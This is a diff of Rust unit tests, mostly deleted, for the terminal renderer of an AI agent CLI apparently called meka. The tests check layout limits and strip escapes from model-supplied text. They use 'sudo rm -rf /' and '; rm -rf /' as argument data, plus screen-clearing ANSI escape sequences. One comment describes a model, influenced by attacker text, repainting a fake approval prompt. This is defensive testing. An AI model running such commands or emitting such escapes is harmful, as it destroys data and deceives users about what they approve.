-    /// `push_param` grew a multi-line arm and `push_item` did not, so a bulleted string kept its
-    /// newlines and put every line after the first at column 0.
-    #[test]
-    fn a_multi_line_array_element_becomes_a_block_not_a_column_zero_run() {
-        let rendered = params(serde_json::json!({
-            "tools": ["file_read\n[tool shell_execute(`sudo rm -rf /`)]"],
-        }));
-        assert_eq!(
-            rendered,
-            "  tools:\n    -\n      file_read\n      [tool shell_execute(`sudo rm -rf /`)]"
-        );
-        assert!(
-            rendered.lines().all(|line| line.starts_with("  ")),
-            "{}",
-            rendered
-        );
-    }
-
-    /// An array fans out one line per element, so the cap has to cover containers and not just a
-    /// long string, or a `checklist_add` with 5000 items evicts the turn from scrollback.
-    #[test]
-    fn an_arguments_container_is_capped_like_a_long_string() {
-        let items: Vec<u32> = (0..5000).collect();
-        let rendered = params(serde_json::json!({"xs": items}));
-        // A container has no source lines to count, so its ceiling is the per-argument row budget.
-        // Bounded, keyed, marked, and ending on the last element is the property; the exact row is
-        // the constant's business.
-        let limits = super::BlockLimits::indicator();
-        assert!(
-            rendered.lines().count() <= limits.rows_per_argument + 1,
-            "{} rows",
-            rendered.lines().count()
-        );
-        assert!(rendered.starts_with("  xs:\n"), "{}", rendered);
-        assert!(
-            rendered
-                .lines()
-                .any(|line| line.trim_start().starts_with("... ") && line.ends_with(" more rows")),
-            "{}",
-            rendered
-        );
-        // The end of a container is as informative as its start, so the cut keeps it.
-        assert!(rendered.ends_with("- 4999"), "{}", rendered);
-    }
-
-    /// An input that is not an object at all takes a separate path, and it is the path with no key
-    /// to hang a per-argument cap on. It is also the one the object path's ceiling never sees, so
-    /// leaving it uncapped let five thousand array elements print in full.
-    /// Past the indent ceiling the block stops indenting rather than stops informing. The width
-    /// invariant covers the "does not run off the edge" half; this covers the half that matters to
-    /// a reader, that the value at the bottom is still on screen and still under a bullet.
-    #[test]
-    fn nesting_past_the_indent_ceiling_still_shows_the_value() {
-        let mut deep = serde_json::json!({"k": "PAYLOAD"});
-        for _ in 0..14 {
-            deep = serde_json::json!([deep]);
-        }
-        let width = 40;
-        let rendered = super::render_tool_params(
-            &serde_json::json!({"a": deep}),
-            width,
-            BlockLimits::indicator(),
-        );
-        let indents: Vec<usize> = rendered
-            .iter()
-            .map(|line| line.len() - line.trim_start_matches(' ').len())
-            .collect();
-        assert!(
-            indents.iter().all(|indent| *indent <= width / 2),
-            "indent grew past the ceiling: {indents:?}"
-        );
-        assert!(
-            rendered.iter().any(|line| line.trim() == "-"),
-            "bullets vanished: {rendered:?}"
-        );
-        assert!(
-            rendered.iter().any(|line| line.contains("k: PAYLOAD")),
-            "the value at the bottom was swallowed: {rendered:?}"
-        );
-    }
-
     /// The failure that made a decision surface show less than a notification: a 90 KB
     /// `shell_execute` filled every row the wrap was given and stopped, leaving the end of the
     /// pipeline -- where `; rm -rf /` lives -- off the last row. The whole block keeps every
@@ -3334,94 +874,6 @@ mod tests {
         assert!(
             !rendered.iter().any(|row| row.contains("more ")),
             "nothing is omitted, so nothing is counted: {rendered:?}"
-        );
-    }
-
-    /// The line that names dropped arguments was the one line in the block composed without a
-    /// budget: `  ... 240 more arguments: ` is twenty-six columns before a single name is added, so
-    /// it broke the width at every width the resolver can produce below twenty-seven.
-    #[test]
-    fn the_line_naming_dropped_arguments_fits_the_width() {
-        let input = serde_json::Value::Object(
-            (0..300)
-                .map(|index| (format!("o{index:03}"), serde_json::json!("v")))
-                .collect(),
-        );
-        for width in [MIN_OUTPUT_WIDTH, 21, 25, 26, 27, 40, 80] {
-            let rendered =
-                super::render_tool_params(&input, width, super::BlockLimits::indicator());
-            let last = rendered.last().cloned().unwrap_or_default();
-            // At the narrow end the word itself is cut; the marker and the count survive, which
-            // is what tells a reader something was dropped.
-            assert!(last.trim_start().starts_with("... "), "{last:?}");
-            assert!(
-                last.chars().any(|character| character.is_ascii_digit()),
-                "no count survived: {last:?}"
-            );
-            assert!(
-                super::display_width(&last) <= width,
-                "width {}: {} columns in {:?}",
-                width,
-                super::display_width(&last),
-                last
-            );
-        }
-    }
-
-    /// `block_rows` is checked before an argument is rendered, so the block reaches it plus one
-    /// argument's own budget. That sum is the real ceiling and the number the docs quote; leaving
-    /// the per-argument cap sharing `block_rows` made it twice what the field claimed.
-    #[test]
-    fn a_block_stays_inside_the_ceiling_its_limits_add_up_to() {
-        {
-            let limits = super::BlockLimits::indicator();
-            // The worst case needs the huge argument to be the one that *crosses* the line, so the
-            // block must be one row short of its gate when that argument is reached. Padding past
-            // the gate instead drops the huge one by name and never renders it, which is a block of
-            // `block_rows` and proves nothing.
-            let mut fields = serde_json::Map::new();
-            for index in 0..limits.block_rows - 1 {
-                fields.insert(format!("a{index:04}"), serde_json::json!("v"));
-            }
-            // Sorts after every `a...`, so it is rendered last.
-            fields.insert(
-                "zzz".to_string(),
-                serde_json::Value::from((0..10_000).collect::<Vec<u32>>()),
-            );
-            let rendered =
-                super::render_tool_params(&serde_json::Value::Object(fields), 80, limits);
-            assert!(
-                rendered.iter().any(|row| row.contains("zzz")),
-                "the huge argument was dropped, so the sum is untested"
-            );
-            let ceiling = limits.block_rows + limits.rows_per_argument + 1;
-            assert!(
-                rendered.len() <= ceiling,
-                "{} rows against a ceiling of {}",
-                rendered.len(),
-                ceiling
-            );
-        }
-    }
-
-    /// An argument that has already reported `... 480 more lines` must not lose that line to the
-    /// row cap above it: the block then admitted to two dropped rows and said nothing about the
-    /// hundreds of lines that actually went.
-    #[test]
-    fn a_row_cut_does_not_delete_the_line_count_beneath_it() {
-        let body = (0..500)
-            .map(|index| format!("line {} {}", index, "x".repeat(280)))
-            .collect::<Vec<_>>()
-            .join("\n");
-        let rendered = super::render_tool_params(
-            &serde_json::json!({ "content": body }),
-            80,
-            super::BlockLimits::indicator(),
-        );
-        assert!(
-            rendered.iter().any(|row| row.contains("more lines")),
-            "the line count was cut away: {:?}",
-            rendered.last()
         );
     }
 
@@ -3458,23 +910,6 @@ mod tests {
         );
     }
 
-    /// A block has no ceiling: `show_content = true` asks to see the reasoning, and the answer it
-    /// shares a renderer with has never had one either. Cutting silently is the failure mode that
-    /// matters, so this pins that the last line survives.
-    #[test]
-    fn a_full_thinking_block_keeps_everything_it_was_given() {
-        let reasoning = (0..2000)
-            .map(|index| format!("reasoning line {index}"))
-            .collect::<Vec<_>>()
-            .join("\n");
-        let body = thinking_rows(&reasoning, RenderMode::Raw, 80);
-        assert_eq!(body.lines().count(), 2000, "a row went missing");
-        assert!(
-            body.ends_with("  reasoning line 1999\n"),
-            "the tail was cut"
-        );
-    }
-
     /// meka's measure has to be at least what the terminal paints, or a budget is a promise it
     /// cannot keep. `unicode_width` merges an emoji and its skin-tone modifier into one two-column
     /// cluster; VTE paints two glyphs across four columns, so every skin-toned emoji in an argument
@@ -3487,42 +922,6 @@ mod tests {
         // Plain text is unaffected, which is what makes over-counting an acceptable trade.
         assert_eq!(super::display_width("hello"), 5);
         assert_eq!(super::display_width("\u{6F22}\u{5B57}"), 4);
-    }
-
-    /// Width is **not** order-independent, so a tail taken by reversing the string is measured in
-    /// an order that is never printed: `display_width` scores a thumbs-up followed by a
-    /// skin-tone modifier as one two-column cluster and the same two characters reversed as
-    /// four columns. An argument of reversed pairs came back a third over its budget, and the
-    /// composed indicator ran to 100 columns where 80 was asked for.
-    ///
-    /// Two changes close this and either would do it alone: measuring the suffix that is printed,
-    /// and taking the larger of the two width measures (a per-character sum does not care about
-    /// order, so the reversal stops mattering). They are kept together because the first is correct
-    /// without depending on a property of the second, and this test fails only if both go --
-    /// `the_measure_is_never_less_than_a_terminal_would_paint` pins the other on its own.
-    #[test]
-    fn a_tail_is_measured_in_the_order_it_is_printed() {
-        let payload = "\u{1F3FB}\u{1F44D}a".repeat(400);
-        for budget in [20usize, 40, 80, 160] {
-            let elided = super::elide_to_width(&payload, budget);
-            assert!(
-                super::display_width(&elided) <= budget,
-                "budget {} gave {} columns",
-                budget,
-                super::display_width(&elided)
-            );
-        }
-        let line = super::tool_indicator_line(
-            "shell_execute",
-            &serde_json::json!({ "command": payload }),
-            None,
-            80,
-        );
-        assert!(
-            super::display_width(&line) <= 80,
-            "{} columns",
-            super::display_width(&line)
-        );
     }
 
     /// A character meka scores at zero columns and a terminal paints anyway is a way to push text
@@ -3550,69 +949,6 @@ mod tests {
         // A space still separates what it separated, because the rule runs after whitespace is
         // flattened rather than before.
         assert_eq!(super::sanitize_to_line("a\nb", usize::MAX), "a b");
-    }
-
-    /// Fitting text to a budget re-measures a growing prefix, so a character that never advances
-    /// the count made the loop walk the whole string and re-measure it every step. Forty
-    /// thousand combining marks in a tool name -- which is model-supplied, unvalidated, and
-    /// rendered in every `tool_params` mode including `off` -- froze the screen for minutes.
-    #[test]
-    fn fitting_text_to_a_budget_is_bounded_by_the_budget() {
-        let zalgo = format!("{}{}", "\u{0301}".repeat(40_000), "A".repeat(300));
-        let started = std::time::Instant::now();
-        let fitted = super::sanitize_to_line(&zalgo, 60);
-        assert!(super::display_width(&fitted) <= 60);
-        let line = super::tool_indicator_line(&zalgo, &serde_json::json!({}), None, 80);
-        assert!(super::display_width(&line) <= 80);
-        // Generous by three orders of magnitude against a quadratic loop. A wall-clock assertion is
-        // crude, but the property *is* about time.
-        assert!(
-            started.elapsed() < std::time::Duration::from_secs(5),
-            "took {:?}",
-            started.elapsed()
-        );
-    }
-
-    /// The property `elide_to_width` exists for, checked through the paths that call it rather than
-    /// on the helper alone. MCP names agree on their prefix, so a tail cut collapses two different
-    /// tools onto one string -- and the header, the indicator and the prompt each cut a name.
-    #[test]
-    fn two_mcp_names_stay_apart_through_every_path_that_cuts_one() {
-        // These agree for fourteen characters, so a budget that keeps fewer collapses them.
-        let search = "mcp__exa__web_search_exa";
-        let fetch = "mcp__exa__web_fetch_exa";
-        assert_ne!(
-            super::tool_header(search, 24),
-            super::tool_header(fetch, 24),
-            "the bare header collapsed two tools onto one string"
-        );
-
-        // The indicator only cuts a name when `TOOL_NAME_MAX_WIDTH` is what bites -- below that it
-        // drops the argument and defers to the header -- so this needs a hallucinated name past the
-        // cap, with room left over for an argument.
-        let long_search = format!("mcp__{}__web_search_exa", "x".repeat(60));
-        let long_fetch = format!("mcp__{}__web_fetch_exa", "x".repeat(60));
-        let argument = serde_json::json!({});
-        assert_ne!(
-            super::tool_indicator_line(&long_search, &argument, Some("query"), 100),
-            super::tool_indicator_line(&long_fetch, &argument, Some("query"), 100),
-            "the indicator collapsed two tools onto one string"
-        );
-
-        // And the cap that made the cut happen at all. A name is model-supplied and unvalidated at
-        // render time, so without a bound a hallucinated one takes the whole line and the argument
-        // never appears, however wide the terminal is.
-        let hallucinated = "n".repeat(400);
-        let line = super::tool_indicator_line(&hallucinated, &argument, Some("query"), 400);
-        assert!(
-            line.contains("query"),
-            "the argument was crowded out: {line}"
-        );
-        let name_columns = super::display_width(&line) - super::display_width("[tool (`query`)]");
-        assert!(
-            name_columns <= super::TOOL_NAME_MAX_WIDTH,
-            "the name took {name_columns} columns"
-        );
     }
 
     /// Wrapping a line of source has to keep it looking like source: continuation rows carry the
@@ -3644,152 +980,6 @@ mod tests {
         for row in &rows {
             assert!(!row.trim().is_empty(), "an all-whitespace row: {rows:?}");
         }
-    }
-
-    /// The numbers the docs quote, asserted as numbers. Deriving a bound from the very limits under
-    /// test made `rows_per_argument` unfalsifiable: raising it tenfold still passed.
-    #[test]
-    fn the_block_ceilings_are_the_ones_the_docs_quote() {
-        let indicator = super::BlockLimits::indicator();
-        assert_eq!(indicator.lines_per_argument, 30);
-        assert_eq!(indicator.rows_per_argument, 32);
-        assert_eq!(indicator.block_rows, 60);
-        assert_eq!(
-            indicator.block_rows + indicator.rows_per_argument + 1,
-            93,
-            "config-file.md quotes 93 rows"
-        );
-        let whole = super::BlockLimits::whole();
-        assert!(
-            whole.wrap
-                && whole.lines_per_argument == usize::MAX
-                && whole.rows_per_argument == usize::MAX
-                && whole.block_rows == usize::MAX,
-            "permissions.md says nothing is left out"
-        );
-    }
-
-    #[test]
-    fn a_bare_array_input_is_capped_like_any_other_block() {
-        let items: Vec<u32> = (0..5000).collect();
-        let rendered = params(serde_json::Value::from(items));
-        let limits = super::BlockLimits::indicator();
-        assert!(
-            rendered.lines().count() <= limits.block_rows + 1,
-            "{} rows",
-            rendered.lines().count()
-        );
-        assert!(
-            rendered
-                .lines()
-                .any(|line| line.trim_start().starts_with("... ") && line.ends_with(" more rows")),
-            "{}",
-            rendered
-        );
-        assert!(rendered.ends_with("- 4999"), "{}", rendered);
-    }
-
-    /// A block cap that cuts a flat line list wherever line 60 lands drops the trailing arguments
-    /// silently and reports a count of rendered lines that says nothing about how much is hidden.
-    /// Losing `path` entirely would make `full` less informative than `summary`.
-    #[test]
-    fn arguments_that_do_not_fit_are_named_rather_than_dropped() {
-        let long = (0..40)
-            .map(|index| format!("line {index}"))
-            .collect::<Vec<_>>()
-            .join("\n");
-        let rendered = params(serde_json::json!({
-            "first": long,
-            "second": long,
-            "third": long,
-            "path": "src/render.rs",
-        }));
-        assert!(
-            rendered.ends_with("  ... 2 more arguments: third, path"),
-            "{}",
-            rendered
-        );
-        // Each argument that did fit keeps its own count, at its own indent.
-        assert_eq!(rendered.matches("    ... 10 more lines").count(), 2);
-    }
-
-    /// The failure the per-argument budget exists to prevent: one enormous argument consuming the
-    /// whole block and taking every argument after it down silently, so a `file_write` shows 60
-    /// lines of `content` and never says which file.
-    #[test]
-    fn one_huge_argument_no_longer_hides_the_ones_after_it() {
-        let long = (0..1000)
-            .map(|index| format!("line {index}"))
-            .collect::<Vec<_>>()
-            .join("\n");
-        let rendered = params(serde_json::json!({"content": long, "path": "a.txt"}));
-        assert!(rendered.contains("    ... 970 more lines"), "{}", rendered);
-        assert!(rendered.ends_with("  path: a.txt"), "{}", rendered);
-    }
-
-    /// A `file_write` body almost always ends with a newline. Treating that as multi-line turned a
-    /// one-line value into a bare `key:` plus a single indented line.
-    #[test]
-    fn a_trailing_newline_does_not_split_a_one_line_value() {
-        assert_eq!(
-            params(serde_json::json!({"content": "one line\n"})),
-            "  content: one line"
-        );
-    }
-
-    /// The name identifies the call and the argument refines it, so when only one fits it is the
-    /// name that survives. Reserving for the argument first rendered
-    /// `mcp__exa__web_search_exa` as `mc`, which is not a shortened name but a different one.
-    #[test]
-    fn a_narrow_line_keeps_the_whole_name_and_drops_the_argument() {
-        let line = super::tool_indicator_line(
-            "mcp__exa__web_search_exa",
-            &serde_json::json!({}),
-            Some("Jane Street first mortgage-backed securities desk"),
-            37,
-        );
-        assert_eq!(line, "[tool mcp__exa__web_search_exa]");
-        assert!(super::display_width(&line) <= 37, "{}", line);
-    }
-
-    /// Given room for both, the argument still appears.
-    #[test]
-    fn a_wide_line_keeps_the_name_and_the_argument() {
-        let line = super::tool_indicator_line(
-            "mcp__exa__web_search_exa",
-            &serde_json::json!({}),
-            Some("Jane Street"),
-            80,
-        );
-        assert_eq!(line, "[tool mcp__exa__web_search_exa(`Jane Street`)]");
-    }
-
-    /// The floor is the precondition every width bound in this file rests on, so it has to hold on
-    /// both paths into the resolver: a configured width and a measured terminal. A configured width
-    /// otherwise wins outright, which is the whole point of setting one.
-    #[test]
-    fn the_resolved_width_is_never_below_what_can_be_composed() {
-        for measured in [None, Some(0), Some(1), Some(10), Some(200)] {
-            assert!(
-                super::resolve_output_width(None, measured) >= super::MIN_OUTPUT_WIDTH,
-                "measured {measured:?}"
-            );
-            assert!(
-                super::resolve_output_width(Some(1), measured) >= super::MIN_OUTPUT_WIDTH,
-                "measured {measured:?}"
-            );
-        }
-        assert_eq!(super::resolve_output_width(Some(120), Some(40)), 120);
-        assert_eq!(super::resolve_output_width(None, Some(40)), 40);
-        assert_eq!(
-            super::resolve_output_width(None, None),
-            super::FALLBACK_OUTPUT_WIDTH
-        );
-        // A terminal that reports nothing is not a terminal one column wide.
-        assert_eq!(
-            super::resolve_output_width(None, Some(0)),
-            super::FALLBACK_OUTPUT_WIDTH
-        );
     }
 
     /// The tail of an elision is taken by reversing the string, taking a prefix, and reversing
@@ -3872,58 +1062,6 @@ mod tests {
         }
     }
 
-    /// A path is back-loaded like an MCP name: cutting the tail keeps the directories and loses the
-    /// filename, which is what you were reading it for. This is the commonest argument shape there
-    /// is, and at 80 columns a tail cut drops the name of the file being read.
-    #[test]
-    fn a_long_path_argument_keeps_its_filename() {
-        let line = super::tool_indicator_line(
-            "file_read",
-            &serde_json::json!({}),
-            Some("/home/you/projects/meka/docs/book/src/configuration/config-file.md"),
-            80,
-        );
-        assert!(line.contains("config-file.md"), "{}", line);
-        assert!(line.starts_with("[tool file_read(`/home"), "{}", line);
-        assert!(super::display_width(&line) <= 80, "{}", line);
-    }
-
-    /// Same reasoning one level down: a value sitting on its key line is an identifier too, so a
-    /// `path:` in a `full` block keeps its filename rather than six directories.
-    #[test]
-    fn a_long_path_value_in_a_block_keeps_its_filename() {
-        // At a width that actually cuts: rendered at `TEST_WIDTH` the 66-column path fits whole,
-        // and the assertions hold for any implementation at all.
-        let rendered = super::render_tool_params(
-            &serde_json::json!({
-                "path": "/home/you/projects/meka/docs/book/src/configuration/config-file.md"
-            }),
-            40,
-            super::BlockLimits::indicator(),
-        )
-        .join("\n");
-        assert!(rendered.contains("..."), "nothing was cut: {rendered}");
-        assert!(rendered.contains("config-file.md"), "{}", rendered);
-        assert!(rendered.starts_with("  path: /home"), "{}", rendered);
-    }
-
-    /// A line of source runs left to right, so a hole in its middle would misrepresent it. Only
-    /// identifiers are elided from the middle.
-    #[test]
-    fn a_content_line_is_cut_from_the_tail_not_the_middle() {
-        let body = format!("fn main() {{\n{}\n}}", "    let x = compute(".repeat(20));
-        let rendered = params(serde_json::json!({ "content": body }));
-        let long = rendered
-            .lines()
-            .find(|line| line.contains("compute"))
-            .unwrap_or_default();
-        assert!(long.ends_with("..."), "{long:?}");
-        assert!(
-            !long.contains("...l"),
-            "middle-elided a content line: {long:?}"
-        );
-    }
-
     /// MCP names agree on their prefix and differ at the end, so a tail cut collapses two different
     /// tools onto the same string.
     #[test]
@@ -3933,170 +1071,6 @@ mod tests {
         assert_ne!(search, fetch, "elided to the same string");
         assert!(search.starts_with("mcp__exa"), "{}", search);
         assert!(search.ends_with("exa"), "{}", search);
-    }
-
-    /// The budget is the whole line, so a long key has to leave room for the value rather than
-    /// spending the width and letting it overflow.
-    #[test]
-    fn a_long_key_still_leaves_room_for_its_value() {
-        let rendered = params(serde_json::json!({"k".repeat(5000): "v".repeat(5000)}));
-        assert_eq!(rendered.lines().count(), 1, "{rendered}");
-        assert!(
-            super::display_width(&rendered) <= TEST_WIDTH,
-            "{}",
-            rendered
-        );
-        let value = rendered.rsplit(": ").next().unwrap_or_default();
-        assert!(
-            super::display_width(value) >= super::TOOL_VALUE_MIN_WIDTH,
-            "value got {} columns",
-            super::display_width(value)
-        );
-    }
-
-    /// The name arrives verbatim off the provider stream and the indicator is emitted before the
-    /// registry is consulted, so a hallucinated one reaches the terminal unvalidated.
-    #[test]
-    fn a_tool_name_is_sanitized_in_every_style() {
-        let forged = "file_read\u{1b}[2J\u{1b}[1;1H";
-        for style in [ToolParams::Off, ToolParams::Summary, ToolParams::Full] {
-            let (header, _) = super::tool_indicator_parts(
-                forged,
-                &serde_json::json!({}),
-                None,
-                style,
-                TEST_WIDTH,
-            );
-            assert!(!header.contains('\u{1b}'), "{style}: {header:?}");
-            assert_eq!(header.lines().count(), 1, "{style}: {header:?}");
-        }
-    }
-
-    /// Swapping two arms of the style match would otherwise pass the whole suite, since every piece
-    /// it dispatches to is only tested on its own.
-    #[test]
-    fn each_style_selects_the_output_it_names() {
-        let input = serde_json::json!({"path": "/etc/hosts"});
-        let (off, off_block) = super::tool_indicator_parts(
-            "file_read",
-            &input,
-            Some("/etc/hosts"),
-            ToolParams::Off,
-            TEST_WIDTH,
-        );
-        assert_eq!(off, "[tool file_read]");
-        assert!(off_block.is_empty());
-
-        let (summary, summary_block) = super::tool_indicator_parts(
-            "file_read",
-            &input,
-            Some("/etc/hosts"),
-            ToolParams::Summary,
-            TEST_WIDTH,
-        );
-        assert_eq!(summary, "[tool file_read(`/etc/hosts`)]");
-        assert!(summary_block.is_empty());
-
-        let (full, full_block) = super::tool_indicator_parts(
-            "file_read",
-            &input,
-            Some("/etc/hosts"),
-            ToolParams::Full,
-            TEST_WIDTH,
-        );
-        assert_eq!(full, "[tool file_read]", "the header drops its argument");
-        assert_eq!(full_block, vec!["  path: /etc/hosts".to_string()]);
-    }
-
-    #[test]
-    fn a_non_object_input_still_renders_its_value() {
-        assert_eq!(params(serde_json::json!("bare")), "  bare");
-    }
-
-    /// Falling through to `Value::to_string` prints a top-level array as raw JSON, contradicting
-    /// the format's own rule that arrays are bullets. The checklist prints unindented at column
-    /// zero, so model text carrying a newline needs no trick at all to sit among meka's own output
-    /// looking like part of it.
-    #[test]
-    fn a_checklist_cannot_plant_a_line_of_its_own() {
-        use crate::checklist::{ChecklistItem, ChecklistStatus};
-
-        let item = ChecklistItem {
-            id: 1,
-            text: "step\u{1b}[2J\rdone".to_string(),
-            status: ChecklistStatus::Pending,
-            reason: None,
-            task: None,
-        };
-        let rendered = super::checklist_item_text(&item, TEST_WIDTH);
-        assert!(!rendered.contains('\u{1b}'), "{rendered:?}");
-        assert!(!rendered.contains('\r'), "{rendered:?}");
-        assert_eq!(rendered.lines().count(), 1, "{rendered:?}");
-    }
-
-    #[test]
-    fn a_top_level_array_input_is_bulleted_like_any_other_array() {
-        assert_eq!(
-            params(serde_json::json!(["file_read", "file_edit"])),
-            "  - file_read\n  - file_edit"
-        );
-    }
-
-    /// A tab cannot move the cursor left or up, so it forges nothing and never needed flattening.
-    /// Collapsing it to one space destroyed the indentation of every tab-indented file.
-    #[test]
-    fn tabs_are_expanded_so_indented_code_survives() {
-        assert_eq!(
-            params(serde_json::json!({"content": "func main() {\n\tif ok {\n\t\treturn\n\t}\n}"})),
-            "  content:\n    func main() {\n        if ok {\n            return\n        }\n    }"
-        );
-    }
-
-    /// Reporting a tab as `(empty)` is not vague, it is wrong: it says the model passed `""`.
-    #[test]
-    fn a_whitespace_only_value_is_not_reported_as_empty() {
-        assert_eq!(
-            params(serde_json::json!({"delimiter": "\t", "body": "", "pad": " ".repeat(300)})),
-            "  delimiter: (whitespace)\n  body: (empty)\n  pad: (whitespace)"
-        );
-    }
-
-    /// `truncate_display` counted characters, so a "200 character" cap let a full-width line take
-    /// 400 columns and wrap into rows the cap exists to prevent.
-    #[test]
-    fn the_width_cap_counts_columns_not_characters() {
-        let wide = "\u{ff21}".repeat(300);
-        let rendered = params(serde_json::json!({"a": wide}));
-        assert!(
-            super::display_width(&rendered) <= TEST_WIDTH,
-            "{} columns",
-            super::display_width(&rendered)
-        );
-    }
-
-    #[test]
-    fn the_elision_count_is_singular_at_one() {
-        let body = (0..super::BlockLimits::indicator().lines_per_argument + 1)
-            .map(|index| format!("line {index}"))
-            .collect::<Vec<_>>()
-            .join("\n");
-        assert!(
-            params(serde_json::json!({"content": body})).ends_with("    ... 1 more line"),
-            "expected a singular count"
-        );
-    }
-
-    #[test]
-    fn an_empty_summary_renders_bare_rather_than_as_empty_backticks() {
-        assert_eq!(
-            tool_indicator_line(
-                "checklist_read",
-                &serde_json::json!({}),
-                Some("   "),
-                TEST_WIDTH
-            ),
-            "[tool checklist_read]"
-        );
     }
 
     #[test]
@@ -4128,31 +1102,6 @@ mod tests {
     fn sanitize_preserves_unicode() {
         let input = "日本語 emoji \u{1F600}";
         assert_eq!(sanitize_for_display(input), "日本語 emoji \u{1F600}");
-    }
-
-    #[test]
-    fn streaming_renderer_basic() {
-        let mut renderer = StreamingRenderer::new(RenderMode::Termimad).capturing(80);
-        renderer.push_delta("hello").unwrap();
-        renderer.finish().unwrap();
-        assert!(
-            renderer.captured().contains("hello"),
-            "the text must reach the sink: {:?}",
-            renderer.captured()
-        );
-    }
-
-    #[test]
-    fn streaming_renderer_strips_leading_newlines() {
-        let mut renderer = StreamingRenderer::new(RenderMode::Termimad).capturing(80);
-        renderer.push_delta("\n\nhello").unwrap();
-        renderer.finish().unwrap();
-        let captured = renderer.captured();
-        assert!(
-            !captured.starts_with('\n'),
-            "leading blank rows are stripped: {captured:?}"
-        );
-        assert!(captured.contains("hello"), "{captured:?}");
     }
 
     /// A bidi override reorders a line without changing a byte of it, so stripping escapes is not
@@ -4195,43 +1144,6 @@ mod tests {
         assert_eq!(sanitize_stream_text("\u{200E}abc"), "\u{200E}abc");
     }
 
-    /// Streamed assistant text is the largest model-controlled surface meka prints, and the
-    /// markdown renderer is not a filter: termimad writes a compound's bytes verbatim. A model
-    /// that has read attacker text could otherwise clear the screen and repaint a convincing
-    /// approval prompt. Asserted on the buffer rather than through the terminal, so removing
-    /// the sanitize call in `push_delta` fails this rather than merely changing what a human
-    /// would have seen.
-    #[test]
-    fn streamed_assistant_text_cannot_carry_terminal_escapes() {
-        let mut renderer = StreamingRenderer::new(RenderMode::Termimad);
-        renderer
-            .push_delta("before \u{1b}[2J\u{1b}[1;1H\u{1b}]0;pwned\u{7}\u{1b}[8mafter")
-            .unwrap();
-
-        assert!(
-            !renderer.buffer.contains('\u{1b}'),
-            "no ESC may reach the terminal: {:?}",
-            renderer.buffer
-        );
-        assert!(
-            renderer.buffer.contains("before") && renderer.buffer.contains("after"),
-            "the prose itself must survive: {:?}",
-            renderer.buffer
-        );
-    }
-
-    /// A CSI sequence can straddle a chunk boundary, so the regex alone would miss it. The control
-    /// filter is what actually closes this: with every ESC dropped, no sequence can form however
-    /// the provider happens to split the stream.
-    #[test]
-    fn an_escape_split_across_two_deltas_cannot_reconstitute() {
-        let mut renderer = StreamingRenderer::new(RenderMode::Termimad);
-        renderer.push_delta("safe \u{1b}").unwrap();
-        renderer.push_delta("[2Jrest").unwrap();
-
-        assert!(!renderer.buffer.contains('\u{1b}'), "{:?}", renderer.buffer);
-    }
-
     /// `\r` needs no escape sequence to forge UI: it returns the cursor to column zero, so a model
     /// can overwrite a line meka already printed. `\n` and `\t` are structural in markdown and only
     /// ever move the cursor forward, so they stay.
@@ -4248,538 +1160,6 @@ mod tests {
         );
     }
 
-    /// crossterm consults `NO_COLOR` on every colored write and a test about colors then sees
-    /// none; this switch overrides it, and nothing else in the suite reads the variable.
-    fn force_colors() {
-        crossterm::style::force_color_output(true);
-    }
-
-    fn termimad_render(markdown: &str) -> String {
-        let mut renderer = StreamingRenderer::new(RenderMode::Termimad).with_width(76);
-        renderer.started = true;
-        renderer.buffer = markdown.to_string();
-        let mut output = renderer.take_termimad_output();
-        let tail = std::mem::take(&mut renderer.buffer);
-        output.push_str(&renderer.finish_termimad_output(tail.trim_end_matches('\n')));
-        output
-    }
-
-    /// The skin is the quiet palette the screen draws with: emphasis by weight, inline code in
-    /// the accent slot, a heading bold, and nothing in 24-bit color.
-    #[test]
-    fn the_markdown_skin_is_the_quiet_palette() {
-        force_colors();
-        let rendered = termimad_render(
-            "# Title\n\nText with **bold**, *italic*, and `code`.\n\n> quoted\n\n* item\n",
-        );
-        assert!(
-            rendered.contains("\x1b[1mbold"),
-            "bold by weight: {rendered:?}"
-        );
-        assert!(
-            rendered.contains("\x1b[3mitalic"),
-            "italic by attribute: {rendered:?}"
-        );
-        assert!(
-            rendered.contains("\x1b[38;5;6mcode"),
-            "inline code in the accent slot: {rendered:?}"
-        );
-        assert!(
-            rendered.contains("\x1b[1mTitle"),
-            "a heading is bold: {rendered:?}"
-        );
-        assert!(
-            fg_color_set(&rendered)
-                .iter()
-                .all(|color| !color.starts_with("38;2;")),
-            "nothing is a 24-bit color: {rendered:?}"
-        );
-    }
-
-    /// minimad only understands `* ` as a list marker, and models write `-`, so without rewriting
-    /// them every list rendered as literal dashes with no bullet and no indentation.
-    #[test]
-    fn dash_and_plus_lists_render_as_bullets() {
-        let rendered = termimad_render("- alpha\n+ beta\n");
-        assert_eq!(
-            rendered.matches('\u{2022}').count(),
-            2,
-            "both markers should become bullets; got {rendered:?}",
-        );
-    }
-
-    /// Every CommonMark bullet marker has to render as a list, and the things that merely look
-    /// like one must not. These are the cases a text-rewriting approach has to special-case by
-    /// hand; the parser gets them from the spec.
-    #[test]
-    fn bullet_markers_and_their_lookalikes() {
-        let bullets =
-            strip_ansi_escapes(&termimad_stream("- alpha\n+ beta\n* gamma\n", usize::MAX));
-        assert_eq!(
-            bullets.matches('\u{2022}').count(),
-            3,
-            "all three markers are bullets in CommonMark; got {bullets:?}",
-        );
-
-        let rule = strip_ansi_escapes(&termimad_stream("above\n\n---\n\nbelow\n", usize::MAX));
-        assert!(
-            !rule.contains('\u{2022}') && rule.contains("above") && rule.contains("below"),
-            "`---` is a horizontal rule, not a bullet; got {rule:?}",
-        );
-
-        let code = strip_ansi_escapes(&termimad_stream("```sh\n- not a bullet\n```\n", usize::MAX));
-        assert!(
-            code.contains("- not a bullet"),
-            "a dash inside a fence is code, not a list; got {code:?}",
-        );
-    }
-
-    /// Nesting comes from the parser's list depth rather than from counting leading spaces, so both
-    /// of the conventional indent widths land on the same level.
-    #[test]
-    fn nested_lists_indent_by_depth() {
-        for document in ["- top\n  - nested\n", "- top\n    - nested\n"] {
-            let rendered = strip_ansi_escapes(&termimad_stream(document, usize::MAX));
-            let lines: Vec<&str> = rendered
-                .lines()
-                .filter(|l| l.contains('\u{2022}'))
-                .collect();
-            assert_eq!(lines.len(), 2, "expected two items from {document:?}");
-            let indent = |line: &str| line.len() - line.trim_start().len();
-            assert!(
-                indent(lines[1]) > indent(lines[0]),
-                "the nested item must be indented further; got {lines:?} from {document:?}",
-            );
-        }
-    }
-
-    /// The reason a text rewrite is dangerous around code: underscores are identifiers far more
-    /// often than emphasis, and CommonMark says an intraword underscore is literal.
-    #[test]
-    fn underscore_emphasis_follows_commonmark() {
